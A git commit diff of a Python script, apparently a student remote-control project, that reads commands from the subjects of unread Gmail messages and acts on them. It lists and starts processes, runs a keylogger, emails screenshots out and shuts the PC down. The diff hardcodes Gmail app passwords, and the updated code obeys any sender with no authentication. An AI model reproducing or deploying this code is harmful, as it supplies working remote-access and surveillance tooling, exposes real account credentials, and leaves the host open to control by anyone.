640b7f4e6ab34863ea20e333a1ee4487c17442b2
HandsomeBoy699 <89534486+Begineer17@users.noreply.github.com>
2023-11-09 15:41:44 +0700

    Update MailChecker.py

--- MailChecker.py
+++ MailChecker.py
@@ -11,22 +11,23 @@ import shutdown
 from process_app import *
 from keylogger import *
 
-server = 'imap.gmail.com'
-username_receiver = 'mangmaytinhremotecontrol@gmail.com'
-password_receiver = 'lmlx vrwx cwym hvqz'
-username_sender = "test.sender.pp@gmail.com"
-password_sender = "mqre gihn qzct yulz"
-
-imap = imaplib.IMAP4_SSL(host=server, port=993)
-
-imap.login(username_receiver, password_receiver)
-
-# Check mail and implement
+#-------------------------------------------------------------------------------------------------
 smtp_server = 'smtp.gmail.com'  # SMTP server for Gmail
 smtp_port = 587  # Port for TLS
 
+username_checker = 'mangmaytinhremotecontrol@gmail.com'
+password_checker = 'lmlx vrwx cwym hvqz'
+username_receiver = ""
+#-------------------------------------------------------------------------------------------------
+# CONNECT + LOGIN
 
-def send_email(sender, receiver, subject, body, image_data=None):
+imap = imaplib.IMAP4_SSL(host = 'imap.gmail.com', port = 993)
+imap.login(username_checker, password_checker)
+
+#-------------------------------------------------------------------------------------------------
+# SEND MAIL
+
+def send_email(sender, receiver, subject, body, image_data = None):
     msg = MIMEMultipart()
     msg["From"] = sender
     msg["To"] = receiver
@@ -38,57 +39,59 @@ def send_email(sender, receiver, subject, body, image_data=None):
     text = msg.as_string()
     server = smtplib.SMTP(smtp_server, smtp_port)
     server.starttls()
-    server.login(username_receiver, password_receiver)
+    server.login(username_checker, password_checker)
     server.sendmail(sender, receiver, text)
     server.quit()
 
+#-------------------------------------------------------------------------------------------------
+# READ MAIL
 
 def CheckAndDo(cmd):
     if (cmd == 'applications'):
-        send_email(username_receiver, username_sender,
+        send_email(username_checker, username_receiver,
                    "List of applications:", execute_msg(cmd))
     elif (cmd == 'processes'):
-        send_email(username_receiver, username_sender,
+        send_email(username_checker, username_receiver,
                    "List of processes:", execute_msg(cmd))
     elif ('Start' in cmd):
-        send_email(username_receiver, username_sender,
+        send_email(username_checker, username_receiver,
                    "List of processes:", execute_msg(cmd))
     elif (cmd == 'keylogger'):
         # duration of keylogger
         print(get_key_log(cmd))
     elif (cmd == 'screenshot'):
         image_data = screenshot.screen_shot()
-        send_email(username_receiver, username_sender,
-                   "Screenshot Talen!", "See attachment: ", image_data)
+        send_email(username_checker, username_receiver,
+                   "Screenshot Taken!", "See attachment: ", image_data)
     elif (cmd == 'shutdown'):
-        send_email(username_receiver, username_sender,
+        send_email(username_checker, username_receiver,
                    "Shutting Down PC!", "PC is shutting down...")
         shutdown.shutdown()
     else:
         print(cmd)
 
-
-# Select unseen message in Inbox to read
-cnt = 0
 cmd = 'start'
 while cmd != 'quit':
     imap.select("Inbox")
-    res, mailIds = imap.search(None, '(UNSEEN)')
+    res, mailIds = imap.search(None, '(UNSEEN)')  #Find all unseen mails in Inbox to read
     print(res)
 
-    # Try to read email
+    # Read every unseen mail
     for id in mailIds[0].decode().split():
         res, mailData = imap.fetch(id, '(RFC822)')
         message = email.message_from_string(mailData[0][1].decode())
 
-        # Get message
+        # Get message from Subject part of the mail
         cmd = message.get("Subject")
-        CheckAndDo(cmd)
+        username_receiver = message.get("From")
+        CheckAndDo(cmd = cmd)
 
     imap.close()
 
     time.sleep(0.4)
 
-print("Byee")
+print("Bye !!!")
+
+#-------------------------------------------------------------------------------------------------
 
 imap.logout()
